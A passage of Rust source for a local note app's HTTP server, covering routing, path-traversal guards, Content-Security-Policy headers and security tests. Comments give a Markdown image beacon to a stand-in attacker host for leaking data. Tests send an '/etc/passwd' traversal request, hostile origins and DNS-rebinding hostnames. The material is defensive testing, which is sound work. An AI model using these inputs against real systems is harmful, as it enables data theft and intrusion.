    // Pairing and the sharing settings — transport-shaped for the same reason the agent routes
    // are: `dispatch` is shared with `fm-cli` and the phone, and *who is calling* is a property
    // of the connection, which neither of them has.
    if let Some(done) = share::route(reader.get_mut(), &path, &body, peer, state) {
        return done;
    }

    // The study agent's transport routes — the on/off setting, the live "working…" activity, and
    // presence — all live in the `agent` module behind the `agent` feature (never a `dispatch`
    // command, so the shared core stays agent-agnostic). Without the feature this call is gone and the
    // routes don't exist. `None` means "not an agent route" — fall through to the command dispatch.
    #[cfg(feature = "agent")]
    if let Some(done) = agent::route(reader.get_mut(), &path, &body, state) {
        return done;
    }

    let (status, ctype, data) = if method == "POST" && path.starts_with("/api/") {
        api(&path[5..], &body, &scope, state)
    } else if method == "GET" || method == "HEAD" {
        static_file(&path, state)
    } else {
        ("405 Method Not Allowed", "text/plain".to_string(), b"method not allowed".to_vec())
    };

    write_response(reader.get_mut(), status, &ctype, &data)
}

/// Turn one HTTP request into one [`dispatch`] call, and its answer back into HTTP.
///
/// The only translation with any content: named arguments arrive either as a JSON body or
/// as a query string, and `dispatch` should not have to care which. `ingest` is why both
/// exist — there the raw body *is* the file, so its name and target vault cannot also be in
/// it and ride in the URL instead (`/api/ingest?name=<urlencoded>&vault=<name>`).
///
/// **A query string means the body is not arguments — it is payload.** Overlaying the two
/// would read a JSON *asset* as its own arguments: upload a file containing
/// `{"vault":"lab"}` and it would file itself into someone else's audience. Today no
/// command wants both, so "either, never both" is exactly today's behaviour and closes that
/// by construction rather than by the body happening not to parse.
///
/// Errors come back as a plain-text 500 body, which the UI shows in its error banner or
/// degrades to the missing-asset placeholder.
fn api(
    cmd: &str,
    body: &[u8],
    scope: &Scope,
    state: &AppState,
) -> (&'static str, String, Vec<u8>) {
    let (cmd, query) = cmd.split_once('?').unwrap_or((cmd, ""));

    let args: Value = if query.is_empty() {
        serde_json::from_slice(body).unwrap_or(Value::Null)
    } else {
        Value::Object(query_pairs(query).map(|(k, v)| (k, Value::String(v))).collect())
    };

    match dispatch_as(cmd, &args, body, &state.app, &Desktop, scope) {
        Ok(Output::Bytes(b)) => ("200 OK", "application/octet-stream".to_string(), b),
        Ok(Output::Json(b)) => ("200 OK", "application/json".to_string(), b),
        Err(msg) => {
            ("500 Internal Server Error", "text/plain; charset=utf-8".to_string(), msg.into_bytes())
        }
    }
}

/// A switch from the environment, read as a **value**, with a default for when it is absent.
///
/// Two corrections live here. `var_os(..).is_some()` meant `FM_OPEN=0` turned the browser *on* —
/// the opposite of what anyone typing it meant, and unarguable once a launcher shipped that a user
/// might edit.
///
/// And the **defaults are on**, which matters more. Opening the browser and quitting with the tab
/// were opt-in, set only by a launcher — so anyone who ran the binary directly met a console
/// printing an address, copied it into a browser, and then closed the window that was keeping their
/// notebook alive. That is not a mistake a person makes; it is a trap the program set. Someone who
/// double-clicks cannot set an environment variable, and someone who can set one is a developer who
/// can equally turn these off.
fn env_flag(key: &str, default: bool) -> bool {
    match std::env::var(key) {
        Ok(v) => !matches!(v.trim().to_ascii_lowercase().as_str(), "" | "0" | "false" | "no" | "off"),
        Err(_) => default,
    }
}

/// Is *formicaria* the thing already listening on `addr`?
///
/// Distinguishes "I double-clicked twice" from "something unrelated holds this port". They need
/// opposite answers — the first is not an error and the user just wants their app, the second
/// cannot be fixed by opening a browser — and guessing wrong either strands the user or points
/// them at a stranger's web page.
///
/// `/api/alive` is the cheapest honest witness: it answers 200 with JSON to a loopback caller and
/// does not care about the method, while anything that is not us refuses, times out, or answers
/// differently. Short timeouts throughout: this runs on the startup path of every launch that
/// finds a busy port, and a hung probe would be indistinguishable from a hung app.
fn serving_formicaria(addr: &str) -> bool {
    let Ok(mut sock) = TcpStream::connect(addr) else { return false };
    let timeout = Some(Duration::from_millis(500));
    if sock.set_read_timeout(timeout).is_err() || sock.set_write_timeout(timeout).is_err() {
        return false;
    }
    let req = format!("GET /api/alive HTTP/1.1\r\nHost: {addr}\r\nConnection: close\r\n\r\n");
    if sock.write_all(req.as_bytes()).is_err() {
        return false;
    }
    let mut head = [0u8; 32];
    let read = sock.read(&mut head).unwrap_or(0);
    head[..read].starts_with(b"HTTP/1.1 200")
}

/// Hand a file or URL to the OS to open with whatever it thinks owns it — the one place
/// that knows how each platform spells that. Every OS has this; only the name differs.
fn open_native(target: &std::ffi::OsStr) -> std::io::Result<()> {
    #[cfg(target_os = "linux")]
    let mut cmd = {
        let mut c = std::process::Command::new("xdg-open");
        c.arg(target);
        c
    };
    #[cfg(target_os = "macos")]
    let mut cmd = {
        let mut c = std::process::Command::new("open");
        c.arg(target);
        c
    };
    // `start` is a cmd builtin, not a program, so it needs a shell. The empty "" is the
    // window title: `start` reads a first quoted argument as the title, so without it a
    // quoted path would be swallowed as one and nothing would open.
    #[cfg(target_os = "windows")]
    let mut cmd = {
        let mut c = std::process::Command::new("cmd");
        c.args(["/C", "start", ""]).arg(target);
        c
    };
    // Anywhere else — Android first, and the reason this arm exists: without it the three
    // `cfg`s above are all false, `cmd` is never bound, and **`fm-serve` does not compile for
    // Android at all**. The same shape of hole as `fm_app::vaults::config_dir` had.
    //
    // It is a genuine `Unsupported`, not a stub. There is no `xdg-open` on Android: handing a
    // file to whatever owns it means an `Intent`, which needs the JVM and therefore a real
    // shell — which is precisely why `open_external` was made a `Host` trait method rather than
    // a `#[cfg]` ladder inside `fm-app` (`mobile-design.md`, ruling 1). A mobile shell
    // implements `Host` and never reaches this function; `fm-serve`-on-device is a test
    // fixture, and a test fixture should say what it cannot do rather than pretend.
    #[cfg(not(any(target_os = "linux", target_os = "macos", target_os = "windows")))]
    return Err(std::io::Error::new(
        std::io::ErrorKind::Unsupported,
        "opening a file with the system handler needs a platform shell on this OS",
    ));

    #[cfg(any(target_os = "linux", target_os = "macos", target_os = "windows"))]
    cmd.spawn().map(|_| ())
}

/// Serve a file from the built UI — from `FM_UI_DIST` when it is set, otherwise from the
/// copy baked into this binary. Unknown non-file paths fall back to index.html so the
/// single-page app owns client-side routing. Guards against `..` path traversal.
fn static_file(path: &str, state: &AppState) -> (&'static str, String, Vec<u8>) {
    let clean = path.split('?').next().unwrap_or("/");
    let rel = if clean == "/" { "index.html" } else { clean.trim_start_matches('/') };
    // Only reachable on the on-disk path, but checked for both: a guard that applies
    // sometimes is a guard nobody can reason about.
    if rel.split('/').any(|seg| seg == "..") {
        return ("400 Bad Request", "text/plain".to_string(), b"bad path".to_vec());
    }
    match read_asset(state, rel) {
        Some(bytes) => ("200 OK", content_type(rel).to_string(), bytes),
        // The SPA owns its own routes, so an unknown path is a route, not a 404.
        None => match read_asset(state, "index.html") {
            Some(bytes) => ("200 OK", "text/html; charset=utf-8".to_string(), bytes),
            None => ("404 Not Found", "text/plain".to_string(), b"not found".to_vec()),
        },
    }
}

/// Serve one page of the built manual, from the copy baked into this binary.
///
/// **Its own function rather than a branch in [`static_file`], for two reasons that are really
/// one: there is no SPA fallback here, and the response carries its own Content-Security-Policy.**
///
/// The fallback first. `static_file` answers an unknown path with `index.html` so the frontend
/// owns client-side routing; right for `/board`, and wrong here, where a mistyped chapter would
/// render the *notebook* and look like a page that exists.
///
/// The policy second, and it is the one that would have shipped broken. mdBook writes six inline
/// `<script>` blocks into every page — they set `path_to_root`, pick the theme before first paint,
/// and restore the sidebar — and [`CSP`] has no `'unsafe-inline'`, so under the app's own header
/// the manual arrives with no theme, no chapter list and no search, and *nothing says why*. It
/// returns 200 with the right bytes the whole time, which is exactly the kind of failure a curl
/// check calls a pass.
fn manual(conn: &mut dyn Conn, path: &str) -> std::io::Result<()> {
    // `/manual` must become `/manual/` before a byte is served: every href, stylesheet and script
    // in the book is relative, so at `/manual` they resolve one level too high and the page loads
    // bare. A real 301 rather than a meta-refresh — `write_response_with` already threads extra
    // header lines through for `/api/pair`.
    if path == "/manual" {
        return write_response_with(
            conn,
            "301 Moved Permanently",
            "text/plain",
            "Location: /manual/\r\n",
            b"",
        );
    }
    let rel = path["/manual/".len()..].split(['?', '#']).next().unwrap_or("");
    let rel = if rel.is_empty() { "index.html" } else { rel };
    // The same guard as the UI path, for the same reason: a guard that applies sometimes is a
    // guard nobody can reason about.
    if rel.split('/').any(|seg| seg == "..") {
        return write_response(conn, "400 Bad Request", "text/plain", b"bad path");
    }
    match MANUAL_ASSETS.iter().find(|(name, _)| *name == rel) {
        Some((_, bytes)) => {
            write_response_full(conn, "200 OK", content_type(rel), "", MANUAL_CSP, bytes)
        }
        // Two different 404s, because they have two different fixes and one of them is ours.
        None if MANUAL_ASSETS.is_empty() => write_response(
            conn,
            "404 Not Found",
            "text/plain; charset=utf-8",
            b"no manual is embedded in this binary - run `pixi run docs` and rebuild",
        ),
        None => write_response(
            conn,
            "404 Not Found",
            "text/plain; charset=utf-8",
            b"that page is not in the manual - start at /manual/",
        ),
    }
}

/// The manual's policy. See [`manual`] for why it is not [`CSP`].
///
/// `script-src 'unsafe-inline'` is the concession; **`connect-src 'none'` is what pays for it.**
/// These pages are our own build output and no note body reaches them, but a same-origin document
/// with relaxed script rules still should not be able to call `/api/` — and with `connect-src
/// 'none'` it provably cannot. Checked against the book's own JS: `toc.js`, `searcher.js` and
/// elasticlunr make no network call at all (the search index arrives as a `<script src>`, not a
/// fetch), so nothing here needs the network.
const MANUAL_CSP: &str = "default-src 'self'; \
img-src 'self' data:; \
style-src 'self' 'unsafe-inline'; \
font-src 'self'; \
script-src 'self' 'unsafe-inline'; \
connect-src 'none'; \
object-src 'none'; \
frame-src 'none'; \
frame-ancestors 'none'; \
base-uri 'self'; \
form-action 'none'";

/// One UI file, from wherever the UI is coming from: an explicit `FM_UI_DIST` (the dev
/// loop — edit a `.svelte`, reload, no Rust rebuild) or the embedded table (every release
/// launch, so the binary needs nothing beside it).
fn read_asset(state: &AppState, rel: &str) -> Option<Vec<u8>> {
    match &state.dist {
        Some(dir) => std::fs::read(dir.join(rel)).ok(),
        None => UI_ASSETS.iter().find(|(name, _)| *name == rel).map(|(_, b)| b.to_vec()),
    }
}

/// Every `key=value` in a `&`-joined query string, percent-decoded.
fn query_pairs(query: &str) -> impl Iterator<Item = (String, String)> + '_ {
    query.split('&').filter(|s| !s.is_empty()).filter_map(|kv| {
        let (k, v) = kv.split_once('=')?;
        Some((percent_decode(k), percent_decode(v)))
    })
}

/// Minimal percent-decode for a query value (`encodeURIComponent` output).
/// Preserves UTF-8 (a decoded byte sequence is re-read as UTF-8).
fn percent_decode(s: &str) -> String {
    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        match b[i] {
            b'%' if i + 2 < b.len() => match (hexval(b[i + 1]), hexval(b[i + 2])) {
                (Some(h), Some(l)) => {
                    out.push(h * 16 + l);
                    i += 3;
                }
                _ => {
                    out.push(b'%');
                    i += 1;
                }
            },
            b'+' => {
                out.push(b' ');
                i += 1;
            }
            c => {
                out.push(c);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn hexval(c: u8) -> Option<u8> {
    match c {
        b'0'..=b'9' => Some(c - b'0'),
        b'a'..=b'f' => Some(c - b'a' + 10),
        b'A'..=b'F' => Some(c - b'A' + 10),
        _ => None,
    }
}

fn content_type(name: &str) -> &'static str {
    match name.rsplit('.').next().unwrap_or("") {
        "html" => "text/html; charset=utf-8",
        "js" | "mjs" => "text/javascript; charset=utf-8",
        "css" => "text/css; charset=utf-8",
        "json" => "application/json",
        "svg" => "image/svg+xml",
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "webp" => "image/webp",
        "gif" => "image/gif",
        "ico" => "image/x-icon",
        "woff2" => "font/woff2",
        "woff" => "font/woff",
        "wasm" => "application/wasm",
        _ => "application/octet-stream",
    }
}

/// The one line that makes "nothing phones home" true rather than merely intended.
///
/// A note is Markdown, and Markdown renders remote images. Without this, a single
/// `![](https://attacker/p.png?leak=…)` in a note someone else wrote — pulled in by a
/// merge, a copy, or a shared vault — fetches an attacker's URL **on render, from the
/// user's machine**. That is not a hypothetical XSS chain: it needs no script, survives
/// DOMPurify (whose allow-list permits `https:` URLs), and survives a human reading the
/// diff. The app already self-hosts Excalidraw's fonts to avoid exactly this; the
/// renderer had no equivalent guard.
///
/// Each clause, and why it is as tight as it is:
/// - `default-src 'self'` — the backstop for anything not named below.
/// - `img-src 'self' data: blob:` — the beacon fix. `data:`/`blob:` are local bytes
///   (pasted images, object URLs), so they carry no request off the machine.
/// - `style-src … 'unsafe-inline'` — unavoidable and low-risk: Mermaid injects `<style>`,
///   and KaTeX/Excalidraw set `style=` attributes on every element they draw.
/// - `script-src 'self'` with **no** `'unsafe-inline'` — the clause worth protecting.
///   Excalidraw's asset-path line was moved out of `index.html` into its own file for it.
///   `wasm-unsafe-eval` allows bundled WebAssembly without allowing `eval` of strings.
/// - `connect-src 'self'` — even a script that does run cannot exfiltrate by `fetch`.
/// - `object-src 'none'`, `base-uri 'self'`, `form-action 'none'` — close the
///   remaining ways a document can be made to reach out.
/// - `frame-src 'self'` — the read view renders a PDF in an `<iframe>` pointing at
///   `/api/blob/…` (`ui/src/lib/render.ts`). This clause read `'none'` until 2026-08-29, which
///   blocked that frame outright: a PDF showed a broken-document placeholder while Settings and
///   the release README both said PDFs were "stored, opened and shown". Measured in a browser
///   rather than reasoned about — the console said `CSP BLOCKED: frame-src`. Widening to
///   `'self'` grants a *note body* nothing: DOMPurify's default tag allowlist contains no
///   `iframe`/`object`/`embed`/`frame` (checked against the pinned 3.4.12 with `render.ts`'s
///   own `ALLOWED_URI_REGEXP`), so the only frame on the page is the one the renderer builds
///   itself, after sanitising, from a blob `inline_safe()` already agreed to serve inline.
///   `MANUAL_CSP` keeps `'none'`: the book is static HTML and frames nothing.
/// - `frame-ancestors 'none'` — **not** covered by `default-src`, and the one clause aimed at
///   the threat the Host/Origin guards above already take seriously: the server sits at a fixed
///   localhost port with no authentication, so any page the user visits can frame it. Without
///   this, that page can overlay a destructive control and have the user click it.
/// - `media-src`/`font-src`/`worker-src` — the app's own needs: `<video>` from object URLs,
///   KaTeX's bundled woff2, and pica's `blob:` resize worker (Excalidraw image insert).
///
/// **Deliberately absent: `'unsafe-eval'`.** Excalidraw's font *subsetter* is harfbuzz compiled
/// with emscripten embind, which calls `Function(string)` — so `getContent()` throws, is caught
/// by Excalidraw, and an exported SVG embeds a font URL instead of the font bytes. That is a
/// real, accepted loss: exports render in fallback fonts elsewhere. Allowing `'unsafe-eval'`
/// to fix it would hand every string in a note a path to execution, which is the whole thing
/// this policy exists to prevent. In-app board rendering is unaffected.
///
/// **Not stopped by any CSP:** a top-level navigation the user clicks
/// (`[click here](https://attacker/?leak=…)`). `navigate-to` was dropped from the spec.
/// `Referrer-Policy: no-referrer` limits what such a click carries.
const CSP: &str = "default-src 'self'; \
img-src 'self' data: blob:; \
media-src 'self' blob:; \
style-src 'self' 'unsafe-inline'; \
font-src 'self' data:; \
script-src 'self' 'wasm-unsafe-eval'; \
worker-src 'self' blob:; \
connect-src 'self'; \
object-src 'none'; \
frame-src 'self'; \
frame-ancestors 'none'; \
base-uri 'self'; \
form-action 'none'";

pub(crate) fn write_response(
    stream: &mut dyn Conn,
    status: &str,
    ctype: &str,
    body: &[u8],
) -> std::io::Result<()> {
    write_response_with(stream, status, ctype, "", body)
}

/// The same, plus caller-supplied header lines (each already `\r\n`-terminated).
///
/// Exactly one caller needs it — `/api/pair`, to set the device's cookie — and it goes through
/// here rather than hand-building a header block so that the security headers above cannot be
/// forgotten by a route that only wanted to add one line. That is not hypothetical: the 416
/// branch in `blob.rs` built its own header and was, for a while, the only response in the
/// server without a CSP.
pub(crate) fn write_response_with(
    stream: &mut dyn Conn,
    status: &str,
    ctype: &str,
    extra: &str,
    body: &[u8],
) -> std::io::Result<()> {
    write_response_full(stream, status, ctype, extra, CSP, body)
}

/// The one place a response is written. `csp` is a parameter rather than a constant for exactly
/// one caller — [`manual`] — and it goes through here for the same reason `/api/pair`'s extra
/// header does: a route that only wanted to change one line must not be able to lose the other
/// three security headers on its way past.
pub(crate) fn write_response_full(
    stream: &mut dyn Conn,
    status: &str,
    ctype: &str,
    extra: &str,
    csp: &str,
    body: &[u8],
) -> std::io::Result<()> {
    let header = format!(
        "HTTP/1.1 {status}\r\nContent-Type: {ctype}\r\nContent-Security-Policy: {csp}\r\nX-Content-Type-Options: nosniff\r\nReferrer-Policy: no-referrer\r\n{extra}Content-Length: {}\r\nCache-Control: no-store\r\nConnection: close\r\n\r\n",
        body.len()
    );
    stream.write_all(header.as_bytes())?;
    stream.write_all(body)?;
    stream.flush()
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::{BufRead as _, BufReader as _BufReader, Read as _Read};
    use std::net::TcpStream;

    /// Drive the **real** `handle` over a real socket with a raw request, and return the
    /// status line plus headers.
    ///
    /// The guards below are the ones that decide whether a page you merely visited can reach
    /// your vault, and until now none of them had a test — the whole transport was verified
    /// by hand. They are also exactly the kind of code that is easy to get subtly wrong and
    /// impossible to notice: a guard that stops refusing still serves every page correctly.
    fn request(raw: &str, origins: Vec<String>) -> (String, String) {
        request_as(raw, origins, Peer { loopback: true, tls: false }, None)
    }

    /// The same, with the caller's identity chosen rather than inferred.
    ///
    /// A test cannot make the OS deliver a genuinely non-loopback connection, and it should not
    /// try: `Peer` is computed once in the accept loop from `peer_addr()` and then *carried*, so
    /// supplying it here exercises precisely the code every real remote request runs. `shared`
    /// turns the feature on, since a remote peer is refused outright when the user has not shared
    /// anything — which is itself worth asserting.
    /// A request from a paired device: sharing on, and a device registered for vault `v` holding
    /// `token`. `None` means paired-with-nothing — a stranger on the network.
    fn remote(raw: &str, token: Option<&str>) -> (String, String) {
        request_as(raw, ours(), Peer { loopback: false, tls: true }, Some(token))
    }

    fn request_as(
        raw: &str,
        origins: Vec<String>,
        peer: Peer,
        shared: Option<Option<&str>>,
    ) -> (String, String) {
        let dir = tempfile::tempdir().unwrap();
        let vault = dir.path().join("v");
        std::fs::create_dir_all(vault.join("notes")).unwrap();
        let store = fm_core::MultiStore::open(&[("v".to_string(), vault.clone())]).unwrap();
        let cfg = fm_app::vaults::VaultConfig { name: "v".into(), path: vault, restic: None };
        let state = AppState::new(fm_app::App::new(store, vec![cfg], None, false), None, origins, 0);
        if let Some(token) = shared {
            state.share.force_enabled_for_test();
            if let Some(t) = token {
                state.share.add_device_for_test(t, &["v"]);
            }
        }

        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let server = std::thread::spawn(move || {
            let (mut sock, _) = listener.accept().unwrap();
            let _ = handle(&mut sock, peer, &state);
        });

        let mut client = TcpStream::connect(addr).unwrap();
        client.write_all(raw.as_bytes()).unwrap();
        let mut reader = _BufReader::new(&mut client);
        let mut status = String::new();
        reader.read_line(&mut status).unwrap();
        let mut headers = String::new();
        loop {
            let mut line = String::new();
            if reader.read_line(&mut line).unwrap() == 0 || line.trim().is_empty() {
                break;
            }
            headers.push_str(&line);
        }
        let mut body = Vec::new();
        let _ = reader.read_to_end(&mut body);
        server.join().unwrap();
        (status.trim().to_string(), headers)
    }

    fn ours() -> Vec<String> {
        vec!["http://127.0.0.1:8765".into(), "http://localhost:8765".into()]
    }

    fn post(origin: Option<&str>, host: &str) -> String {
        let mut r = format!("POST /api/ping HTTP/1.1\r\nHost: {host}\r\n");
        if let Some(o) = origin {
            r.push_str(&format!("Origin: {o}\r\n"));
        }
        r.push_str("Content-Length: 2\r\n\r\n{}");
        r
    }

    /// The vault sits at a fixed localhost port with no authentication, so any page the user
    /// happens to visit could POST to it — and a `text/plain` body skips the CORS preflight,
    /// so the browser hides the *response* while the side effect still lands.
    #[test]
    fn a_post_from_another_origin_is_refused() {
        let (status, _) = request(&post(Some("http://evil.example"), "127.0.0.1:8765"), ours());
        assert_eq!(status, "HTTP/1.1 403 Forbidden");
    }

    #[test]
    fn a_post_from_our_own_page_is_allowed() {
        for o in ["http://127.0.0.1:8765", "http://localhost:8765"] {
            let (status, _) = request(&post(Some(o), "127.0.0.1:8765"), ours());
            assert_eq!(status, "HTTP/1.1 200 OK", "origin {o} is us");
        }
    }

    /// No `Origin` at all means a non-browser client — curl, a script, a test. That is not a
    /// CSRF vector (there are no ambient credentials to abuse) and refusing it would break
    /// every command-line workflow.
    #[test]
    fn a_post_with_no_origin_is_allowed() {
        let (status, _) = request(&post(None, "127.0.0.1:8765"), ours());
        assert_eq!(status, "HTTP/1.1 200 OK");
    }

    /// DNS rebinding: binding to 127.0.0.1 keeps other *machines* out, but does not decide
    /// which *name* a browser used to arrive. A hostname an attacker controls, resolved to
    /// 127.0.0.1, is same-origin with itself — so the CSRF guard waves it through and the
    /// page can read every response.
    #[test]
    fn a_request_arriving_under_someone_elses_hostname_is_refused() {
        let (status, _) = request(&post(None, "evil.attacker.test:8765"), ours());
        assert_eq!(status, "HTTP/1.1 403 Forbidden");
    }

    #[test]
    fn the_names_we_actually_serve_are_allowed() {
        for h in ["127.0.0.1:8765", "localhost:8765", "[::1]:8765", "127.0.0.1"] {
            let (status, _) = request(&post(None, h), ours());
            assert_eq!(status, "HTTP/1.1 200 OK", "host {h} is us");
        }
    }

    /// HTTP/1.0 and hand-rolled clients send no `Host`. Not a browser, so not this vector —
    /// and refusing it would break curl for no gain.
    #[test]
    fn a_request_with_no_host_is_allowed() {
        let (status, _) =
            request("POST /api/ping HTTP/1.0\r\nContent-Length: 2\r\n\r\n{}", ours());
        assert_eq!(status, "HTTP/1.1 200 OK");
    }

    #[test]
    fn a_traversal_out_of_the_ui_directory_is_refused() {
        let (status, _) = request(
            "GET /../../../../etc/passwd HTTP/1.1\r\nHost: 127.0.0.1:8765\r\n\r\n",
            ours(),
        );
        assert_eq!(status, "HTTP/1.1 400 Bad Request");
    }

    #[test]
    fn an_unsupported_method_is_refused() {
        let (status, _) =
            request("PUT /api/ping HTTP/1.1\r\nHost: 127.0.0.1:8765\r\n\r\n", ours());
        assert_eq!(status, "HTTP/1.1 405 Method Not Allowed");
    }

    /// Liveness must stay reachable without a lock or a dispatch — a hidden tab beats it
    /// forever, and the watchdog's whole job depends on it answering.
    #[test]
    fn the_liveness_endpoint_answers() {
        let (status, _) =
            request("POST /api/alive HTTP/1.1\r\nHost: 127.0.0.1:8765\r\n\r\n", ours());
        assert_eq!(status, "HTTP/1.1 200 OK");
    }

    /// Run one request against a fresh server whose clock was wound back ten minutes, and report
    /// whether that request counted as **somebody being here** — the only input the auto-shutdown
    /// watchdog has.
    fn kept_the_app_alive(raw: &str) -> bool {
        let dir = tempfile::tempdir().unwrap();
        let vault = dir.path().join("v");
        std::fs::create_dir_all(vault.join("notes")).unwrap();
        let store = fm_core::MultiStore::open(&[("v".to_string(), vault.clone())]).unwrap();
        let cfg = fm_app::vaults::VaultConfig { name: "v".into(), path: vault, restic: None };
        let state = Arc::new(AppState::new(
            fm_app::App::new(store, vec![cfg], None, false),
            None,
            ours(),
            0,
        ));
        let long_ago = Instant::now() - Duration::from_secs(600);
        *state.last_seen.lock().unwrap() = long_ago;

        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let server = {
            let state = Arc::clone(&state);
            std::thread::spawn(move || {
                let (mut sock, _) = listener.accept().unwrap();
                let _ = handle(&mut sock, Peer { loopback: true, tls: false }, &state);
            })
        };
        let mut client = TcpStream::connect(addr).unwrap();
        client.write_all(raw.as_bytes()).unwrap();
        let mut sink = Vec::new();
        let _ = _Read::read_to_end(&mut client, &mut sink);
        server.join().unwrap();

        let refreshed = *state.last_seen.lock().unwrap() != long_ago;
        refreshed
    }

    /// A browser tab beating says a person is here, and the app must stay up.
    #[test]
    fn a_tabs_heartbeat_keeps_the_app_alive() {
        assert!(kept_the_app_alive(
            "POST /api/alive HTTP/1.1\r\nHost: 127.0.0.1:8765\r\n\r\n"
        ));
    }

    /// **The assistant must not.** It polls this server every 1–5 s for as long as it runs, so
    /// counting those polls meant the 90-second idle window could never close while it was on:
    /// the app held itself open by asking whether it was open, and `fm-serve` plus a multi-GB
    /// `llama-server` stayed resident until the machine was rebooted. Written against every route
    /// the agent actually calls, not just the liveness probe, because every one of them refreshed
    /// that timer — fixing only `/api/alive` would have left the bug exactly where it was.
    ///
    /// The header is written out here rather than imported: **nothing depends on `fm-agent-run`**,
    /// which is how "the core app never learns the agent exists" is kept true, and a dev-dependency
    /// would spend that property on a test. `ci/checks.sh` asserts the two spellings match.
    #[test]
    fn the_assistants_own_polling_does_not_keep_the_app_alive() {
        for path in ["/api/alive", "/api/thread_roots", "/api/agent_present"] {
            let raw = format!(
                "POST {path} HTTP/1.1\r\nHost: 127.0.0.1:8765\r\n\
                 X-Formicaria-Agent: 1\r\nContent-Length: 2\r\n\r\n{{}}"
            );
            assert!(!kept_the_app_alive(&raw), "{path} held the app open for the assistant");
        }
    }

    // ---- Sharing: who may reach what --------------------------------------------------------
    //
    // Written as **refusal** tests. A test that only checked "a paired device can read its own
    // vault" would pass just as happily against a gate that let everyone read everything, which
    // is the failure mode that matters here.

    const TOKEN: &str = "0123456789abcdef0123456789abcdef";

    fn get(path: &str) -> String {
        format!("GET {path} HTTP/1.1\r\nHost: 192.168.1.5:8765\r\n\r\n")
    }

    fn rpost(path: &str, token: Option<&str>) -> String {
        let cookie = token
            .map(|t| format!("Cookie: {SHARE_COOKIE}={t}\r\n"))
            .unwrap_or_default();
        format!(
            "POST {path} HTTP/1.1\r\nHost: 192.168.1.5:8765\r\n\
             Origin: http://192.168.1.5:8765\r\n{cookie}Content-Length: 2\r\n\r\n{{}}"
        )
    }

    /// Sharing off is the default, and it must be a wall rather than a setting nobody set: a
    /// listener that somehow ends up reachable while the user never opted in refuses everything.
    #[test]
    fn a_remote_request_is_refused_outright_when_nothing_is_shared() {
        let (status, _) =
            request_as(&rpost("/api/ping", Some(TOKEN)), ours(), Peer { loopback: false, tls: true }, None);
        assert_eq!(status, "HTTP/1.1 403 Forbidden");
    }

    /// No token, sharing on: 401 on **every** API surface, including the three that are not
    /// commands and would each have had to remember on their own.
    #[test]
    fn an_unpaired_device_reaches_no_api_at_all() {
        for path in ["/api/ping", "/api/alive", "/api/agent_status", "/api/recent"] {
            let (status, _) = remote(&rpost(path, None), Some(TOKEN));
            assert_eq!(status, "HTTP/1.1 401 Unauthorized", "{path} was reachable unauthenticated");
        }
        let (status, _) = remote(&get("/api/blob/abcdef0123456789"), Some(TOKEN));
        assert_eq!(status, "HTTP/1.1 401 Unauthorized", "blob bytes were served without a token");
    }

    /// A wrong token is not a weaker token.
    #[test]
    fn a_token_we_never_issued_is_refused() {
        let (status, _) = remote(&rpost("/api/ping", Some("not-a-real-token")), Some(TOKEN));
        assert_eq!(status, "HTTP/1.1 401 Unauthorized");
    }

    /// The pairing screen has to load before there is any token, so static assets stay open.
    /// What that discloses is the UI bundle, which is public source.
    #[test]
    fn the_page_itself_loads_so_the_device_can_pair() {
        let (status, _) = remote(&get("/"), Some(TOKEN));
        assert_ne!(status, "HTTP/1.1 401 Unauthorized");
        let (status, _) = remote(&rpost("/api/pair", None), Some(TOKEN));
        assert_ne!(status, "HTTP/1.1 401 Unauthorized", "pairing must be reachable unpaired");
    }

    /// **The regression this gate was re-sited to prevent.** `agent::route` is dispatched before
    /// `api()`, so a denylist that lived inside `api()` never saw `/api/set_agent` — a route that
    /// runs `Command::new("bash")` and starts a multi-GB model on the desktop's GPU, and persists
    /// so it comes back at every launch. A *valid* token must still not reach it.
    #[test]
    fn a_paired_device_cannot_start_a_process_on_the_host() {
        for path in ["/api/set_agent", "/api/set_transcribe", "/api/agent_activity"] {
            let (status, _) = remote(&rpost(path, Some(TOKEN)), Some(TOKEN));
            assert_eq!(status, "HTTP/1.1 403 Forbidden", "{path} was reachable by a paired device");
        }
    }

    /// The rest of the denylist: hands text to `git`, probes the filesystem, discloses the host,
    /// or destroys something irreversibly.
    #[test]
    fn a_paired_device_cannot_reach_the_host_bound_commands() {
        for path in [
            "/api/probe_remote",
            "/api/check_path",
            "/api/config",
            "/api/delete",
            "/api/open_external",
            "/api/create_vault",
            "/api/set_git_remote",
            "/api/backup",
            // Granting permission to publish a vault's review record relicenses shared content and
            // cannot be recalled — a guest device must not answer that for the host.
            "/api/set_supervision",
        ] {
            let (status, _) = remote(&rpost(path, Some(TOKEN)), Some(TOKEN));
            assert_eq!(status, "HTTP/1.1 403 Forbidden", "{path} was reachable by a paired device");
        }
    }

    /// Turning sharing off, minting a code and revoking devices are things a guest must not be
    /// able to do to its host — even holding a valid token.
    #[test]
    fn a_paired_device_cannot_administer_the_sharing_itself() {
        for path in ["/api/set_share", "/api/share_code", "/api/revoke_devices"] {
            let (status, _) = remote(&rpost(path, Some(TOKEN)), Some(TOKEN));
            assert_eq!(status, "HTTP/1.1 403 Forbidden", "{path} was reachable remotely");
        }
    }

    /// With a real token the ordinary surface works, or the gate would be a wall rather than a
    /// door. This is the one non-refusal test here, and it exists to prove the refusals above
    /// are not simply "everything is 403".
    #[test]
    fn a_paired_device_can_use_the_app() {
        let (status, _) = remote(&rpost("/api/ping", Some(TOKEN)), Some(TOKEN));
        assert_eq!(status, "HTTP/1.1 200 OK");
        let (status, _) = remote(&rpost("/api/recent", Some(TOKEN)), Some(TOKEN));
        assert_eq!(status, "HTTP/1.1 200 OK");
    }

    /// The DNS-rebinding guard, on the shared listener. A name an attacker controls, pointed at
    /// the desktop's LAN address, is a name we never published — and a bare IP cannot be rebound
    /// at all, which is why IP literals are what a remote peer must arrive under.
    #[test]
    fn a_remote_request_under_an_invented_hostname_is_refused() {
        let raw = format!(
            "POST /api/ping HTTP/1.1\r\nHost: vault.attacker.example\r\n\
             Origin: http://vault.attacker.example\r\nCookie: {SHARE_COOKIE}={TOKEN}\r\n\r\n"
        );
